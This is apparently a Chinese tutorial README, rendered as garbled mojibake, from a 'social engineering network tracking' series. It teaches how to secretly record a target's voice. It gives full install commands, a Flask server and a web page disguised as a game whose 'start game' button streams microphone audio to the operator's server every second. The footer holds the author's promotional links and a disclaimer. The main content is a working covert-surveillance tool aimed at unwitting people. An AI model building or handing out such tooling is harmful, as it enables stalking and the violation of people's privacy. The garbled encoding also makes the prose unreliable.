#### å·å·å½•éŸ³å¯¹æ–¹çš„å®æ—¶å£°éŸ³ |ã€Šç¤¾ä¼šå·¥ç¨‹å­¦ä¹‹ç½‘ç»œè¿½è¸ªã€‹ç¬¬äº”èŠ‚

****

å­¦ä¼šæœ¬èŠ‚å¯è·å¾—å¦‚ä¸‹æŠ€èƒ½ï¼š

â€¢å·å·å½•å¯¹æ–¹å£°éŸ³

â€¢å¦‚ä½•è®©å¯¹æ–¹é•¿æ—¶é—´åœç•™åœ¨ç•Œé¢

â€¢ä½¿ç”¨åœ¨çº¿AIè‡ªåŠ¨ç¼–å†™å®æ—¶ç”Ÿæ•ˆ

****

è§†é¢‘è®²è§£ï¼šhttps://youtu.be/QxFOMOIDhrM

æˆä¸ºæˆ‘çš„VIPä¼šå‘˜ï¼š https://www.youtube.com/@MeeGooBoo/join

****

è…¾è®¯æ„å»ºï¼šhttps://cnb.cool/

äºŒç»´ç å·¥å…·ï¼šhttps://cli.im/

```
apt update
```

```
apt install python3 python3-pip
```

```
pip install --break-system-packages flask requests
```

templates/index.html

```
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>å®æ—¶å½•éŸ³ä¸Šä¼ </title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            background-color: white;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
        }
        h1 {
            color: #333;
            text-align: center;
        }
        .status {
            margin: 20px 0;
            padding: 10px;
            border-radius: 5px;
            text-align: center;
            font-weight: bold;
        }
        .recording {
            background-color: #ffebee;
            color: #c62828;
        }
        .idle {
            background-color: #e8f5e9;
            color: #2e7d32;
        }
        button {
            display: block;
            width: 200px;
            margin: 20px auto;
            padding: 15px;
            font-size: 18px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s;
        }
        #startButton {
            background-color: #4CAF50;
            color: white;
        }
        #startButton:hover {
            background-color: #45a049;
        }
        #startButton.recording {
            background-color: #f44336;
        }
        #startButton.recording:hover {
            background-color: #d32f2f;
        }
        .info {
            text-align: center;
            color: #666;
            font-size: 14px;
            margin-top: 30px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>å®æ—¶å½•éŸ³ä¸Šä¼ </h1>
        
        <div id="status" class="status idle">å‡†å¤‡å°±ç»ª - ç‚¹å‡»ä¸‹æ–¹æŒ‰é’®å¼€å§‹å½•éŸ³</div>
        
        <button id="startButton">å¼€å§‹æ¸¸æˆ</button>
        
        <div class="info">
            <p>ç‚¹å‡»"å¼€å§‹æ¸¸æˆ"æŒ‰é’®åï¼Œåº”ç”¨å°†å¼€å§‹å½•åˆ¶æ‚¨çš„éŸ³é¢‘å¹¶å®æ—¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ã€‚</p>
            <p>å³ä½¿æ‚¨å…³é—­é¡µé¢ï¼Œå·²ä¸Šä¼ çš„éŸ³é¢‘æ•°æ®ä¹Ÿä¸ä¼šä¸¢å¤±ã€‚</p>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const startButton = document.getElementById('startButton');
            const statusDiv = document.getElementById('status');
            
            let mediaRecorder;
            let audioContext;
            let isRecording = false;
            let sessionId = null;
            let audioChunks = [];
            
            // ç”Ÿæˆå”¯ä¸€ä¼šè¯ID
            function generateSessionId() {
                return Date.now().toString(36) + Math.random().toString(36).substr(2);
            }
            
            // å¼€å§‹å½•éŸ³
            async function startRecording() {
                try {
                    // ç”Ÿæˆæ–°ä¼šè¯ID
                    sessionId = generateSessionId();
                    
                    // é€šçŸ¥æœåŠ¡å™¨å¼€å§‹å½•åˆ¶
                    const formData = new FormData();
                    formData.append('session_id', sessionId);
                    
                    const response = await fetch('/start_recording', {
                        method: 'POST',
                        body: formData
                    });
                    
                    const result = await response.json();
                    if (result.status !== 'started') {
                        throw new Error('æœåŠ¡å™¨æ— æ³•å¼€å§‹å½•åˆ¶');
                    }
                    
                    // è·å–éº¦å…‹é£è®¿é—®æƒé™
                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                    
                    // è®¾ç½®éŸ³é¢‘ä¸Šä¸‹æ–‡å’Œåª’ä½“å½•åˆ¶å™¨
                    audioContext = new AudioContext();
                    const source = audioContext.createMediaStreamSource(stream);
                    
                    // é…ç½®åª’ä½“å½•åˆ¶é€‰é¡¹
                    const options = {
                        mimeType: 'audio/webm;codecs=opus',
                        audioBitsPerSecond: 128000
                    };
                    
                    mediaRecorder = new MediaRecorder(stream, options);
                    
                    // å¤„ç†æ•°æ®å¯ç”¨äº‹ä»¶
                    mediaRecorder.ondataavailable = async function(event) {
                        if (event.data.size > 0) {
                            // ä¸Šä¼ éŸ³é¢‘æ•°æ®åˆ°æœåŠ¡å™¨
                            const formData = new FormData();
                            formData.append('session_id', sessionId);
                            formData.append('audio_data', event.data);
                            
                            try {
                                await fetch('/upload_audio', {
                                    method: 'POST',
                                    body: formData
                                });
                            } catch (error) {
                                console.error('ä¸Šä¼ éŸ³é¢‘æ•°æ®å¤±è´¥:', error);
                            }
                        }
                    };
                    
                    // å¼€å§‹å½•åˆ¶ï¼Œæ¯1000æ¯«ç§’å‘é€ä¸€æ¬¡æ•°æ®
                    mediaRecorder.start(1000);
                    isRecording = true;
                    
                    // æ›´æ–°UI
                    startButton.textContent = 'åœæ­¢æ¸¸æˆ';
                    startButton.classList.add('recording');
                    statusDiv.textContent = 'å½•éŸ³ä¸­...';
                    statusDiv.className = 'status recording';
                    
                } catch (error) {
                    console.error('å¼€å§‹å½•éŸ³å¤±è´¥:', error);
                    statusDiv.textContent = 'é”™è¯¯: ' + error.message;
                }
            }
            
            // åœæ­¢å½•éŸ³
            async function stopRecording() {
                if (mediaRecorder && isRecording) {
                    mediaRecorder.stop();
                    isRecording = false;
                    
                    // é€šçŸ¥æœåŠ¡å™¨åœæ­¢å½•åˆ¶
                    const formData = new FormData();
                    formData.append('session_id', sessionId);
                    
                    try {
                        await fetch('/stop_recording', {
                            method: 'POST',
                            body: formData
                        });
                    } catch (error) {
                        console.error('åœæ­¢å½•éŸ³è¯·æ±‚å¤±è´¥:', error);
                    }
                    
                    // æ›´æ–°UI
                    startButton.textContent = 'å¼€å§‹æ¸¸æˆ';
                    startButton.classList.remove('recording');
                    statusDiv.textContent = 'å½•éŸ³å·²åœæ­¢ï¼ŒéŸ³é¢‘å·²ä¿å­˜';
                    statusDiv.className = 'status idle';
                    
                    sessionId = null;
                }
            }
            
            // åˆå§‹åŒ–æŒ‰é’®ç‚¹å‡»äº‹ä»¶
            startButton.addEventListener('click', function() {
                if (!isRecording) {
                    startRecording();
                } else {
                    stopRecording();
                }
            });
            
            // é¡µé¢å…³é—­å‰çš„å¤„ç†
            window.addEventListener('beforeunload', function() {
                if (isRecording) {
                    // å°è¯•åœ¨é¡µé¢å…³é—­å‰å‘é€æœ€åçš„æ•°æ®
                    // ç”±äºæ˜¯åŒæ­¥è¯·æ±‚ï¼Œå¯èƒ½ä¼šé˜»å¡é¡µé¢å…³é—­ï¼Œä½†èƒ½ç¡®ä¿æ•°æ®å‘é€
                    const formData = new FormData();
                    formData.append('session_id', sessionId);
                    
                    // ä½¿ç”¨åŒæ­¥XHRè¯·æ±‚
                    const xhr = new XMLHttpRequest();
                    xhr.open('POST', '/stop_recording', false);
                    xhr.send(formData);
                }
            });
        });
    </script>
</body>
</html>
```

å¤„ç†å£°éŸ³

```
import os
import uuid
from datetime import datetime
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your_secret_key'
app.config['UPLOAD_FOLDER'] = 'audio_uploads'

# ç¡®ä¿ä¸Šä¼ ç›®å½•å­˜åœ¨
if not os.path.exists(app.config['UPLOAD_FOLDER']):
    os.makedirs(app.config['UPLOAD_FOLDER'])

# å­˜å‚¨ç”¨æˆ·ä¼šè¯å’Œå¯¹åº”çš„æ–‡ä»¶
user_files = {}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start_recording', methods=['POST'])
def start_recording():
    """å¼€å§‹å½•éŸ³å¹¶åˆ›å»ºæ–°æ–‡ä»¶"""
    session_id = request.form.get('session_id')
    if not session_id:
        session_id = str(uuid.uuid4())
    
    filename = f"{datetime.now().strftime('%Y%m%d_%H%M%S')}_{session_id}.webm"
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    
    # ä¸ºæ–°ä¼šè¯åˆ›å»ºæ–‡ä»¶
    user_files[session_id] = {
        'file': open(filepath, 'ab'),  # ä»¥è¿½åŠ äºŒè¿›åˆ¶æ¨¡å¼æ‰“å¼€
        'filename': filename
    }
    print(f"å¼€å§‹å½•éŸ³ä¼šè¯: {session_id}, æ–‡ä»¶: {filename}")
    
    return jsonify({'session_id': session_id, 'status': 'started'})

@app.route('/upload_audio', methods=['POST'])
def upload_audio():
    """å¤„ç†æ¥æ”¶åˆ°çš„éŸ³é¢‘æ•°æ®"""
    session_id = request.form.get('session_id')
    audio_data = request.files.get('audio_data')
    
    if session_id in user_files and audio_data:
        try:
            # å°†éŸ³é¢‘æ•°æ®è¿½åŠ åˆ°æ–‡ä»¶
            user_files[session_id]['file'].write(audio_data.read())
            user_files[session_id]['file'].flush()  # ç¡®ä¿æ•°æ®å†™å…¥ç£ç›˜
            return jsonify({'status': 'success'})
        except Exception as e:
            print(f"å†™å…¥éŸ³é¢‘æ•°æ®é”™è¯¯: {e}")
            return jsonify({'status': 'error', 'message': str(e)}), 500
    
    return jsonify({'status': 'error', 'message': 'æ— æ•ˆçš„ä¼šè¯æˆ–æ•°æ®'}), 400

@app.route('/stop_recording', methods=['POST'])
def stop_recording():
    """åœæ­¢å½•éŸ³å¹¶å…³é—­æ–‡ä»¶"""
    session_id = request.form.get('session_id')
    
    if session_id in user_files:
        user_files[session_id]['file'].close()
        filename = user_files[session_id]['filename']
        del user_files[session_id]
        print(f"å½•éŸ³ä¼šè¯ç»“æŸ: {session_id}, æ–‡ä»¶å·²ä¿å­˜: {filename}")
        return jsonify({'status': 'stopped', 'filename': filename})
    
    return jsonify({'status': 'error', 'message': 'æ— æ•ˆçš„ä¼šè¯'}), 400

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
```



****

****

#### æ”»é˜²æ— ç»å¯¹ï¼ŒæŠ€æœ¯æ— å¥½åï¼Œåœ¨éå®‰å…¨çš„ä¿¡æ¯æ—¶ä»£ï¼Œä¼—äººçš†åœ¨å›šç¬¼ä¹‹ä¸­ï¼Œå…³æ³¨ç‰›é©¬å°è¯•ï¼Œè®©ä½ ä¸€é£å†²å¤©ï¼

****

- **Telegram(æ–‡ä»¶èµ„æºé¢‘é“)ï¼šhttps://t.me/NiuMaXiaoShi**
- **Youtubeï¼š  https://www.youtube.com/@MeeGooBoo**
- **Twitter ( X ï¼‰ï¼š  https://x.com/MeeGooBoo**

****

- ###### éœ€è¦è”ç³»æˆ‘ï¼Ÿè¯·é€šè¿‡ï¼šhttps://t.me/MeeGooBoo
- å¦‚éœ€è´­ä¹°é’»çŸ³ã€é“‚é‡‘ã€é»„é‡‘ç›¸å…³ç å®é¦–é¥°çš„ï¼Œè¯·åŠ æˆ‘å¾®ä¿¡ï¼šAioa700
- æ³¨ï¼šæœ¬äººä¸å‚ä¸ä»»ä½•æ¶‰æ”¿ç›¸å…³è®¨è®ºï¼Œæœ¬äººæ‰€æœ‰å¹³å°å’Œå†…å®¹ä»…ä¾›æŠ€æœ¯ç›¸å…³é¢†åŸŸå­¦ä¹ äº¤æµä½¿ç”¨ã€‚

****

>  [!CAUTION]
>
> æœ¬ä»“åº“æ‰€æœ‰å†…å®¹å‡æ¥è‡ªäº’è”ç½‘å…¬å¼€å†…å®¹æˆ–æœ¬ä»“åº“æ‰€æœ‰è€…åˆ›ä½œï¼Œè¯·å‹¿ç›¸ä¿¡èµ„æºä¸­çš„å¹¿å‘Šï¼Œä¸»åŠ¨è”ç³»ä½ çš„éƒ½æ˜¯éª—å­ï¼Œæé«˜æ™ºå•†è°¨é˜²ä¸Šå½“å—è¯ˆï¼è¯·å‹¿åˆ©ç”¨æœ¬ä»“åº“å®æ–½è¿åä»»ä½•é€‚ç”¨æ³•å¾‹æ³•è§„ç­‰çŠ¯ç½ªæ´»åŠ¨ï¼æœ¬ä»“åº“æ‰€æœ‰è€…ä¸å¯¹å› ä½¿ç”¨æœ¬ä»“åº“å†…å®¹å¯¼è‡´çš„ä»»ä½•åæœæ‰¿æ‹…è´£ä»»ï¼

****

## ä½ çš„èµåŠ©æ˜¯åŠŸå¾·æ— é‡ğŸ’°

>  [!NOTE]
>
> å¦‚æœä½ è§‰å¾—æœ¬ä»“åº“å¯¹ä½ æœ‰å¸®åŠ©ï¼Œä½ å¯ä»¥èµåŠ©æˆ‘ä»¬ä¸€æ¯å’–å•¡ï¼Œé¼“åŠ±æˆ‘ä»¬ç»§ç»­ç»´æŠ¤ä¸‹å»ã€‚<br>
> æˆä¸ºæˆ‘çš„Patreonä¼šå‘˜ï¼šhttps://www.patreon.com/MeeGooBoo/membership<br>
> é€šè¿‡Paypalæ”¯æŒæˆ‘ï¼šhttps://paypal.me/MoGuoBiao<br>
> é€šè¿‡æ¯”ç‰¹å¸æ”¯æŒæˆ‘ï¼šbc1qkwrq5plek62fmfaynyphfuuepm6cxd4fsh5wrp



<p align="center" >
    <img src="https://raw.githubusercontent.com/MeeGooBoo/2025/refs/heads/main/static/imgs/logo.png" width="150">
    <h3 align="center">ç‰›é©¬å°è¯•(è«å›½æ ‡)</h3>
    <p align="center">
        <img src="https://raw.githubusercontent.com/MeeGooBoo/2025/refs/heads/main/static/imgs/pays.png">
    </p>
</p>


****

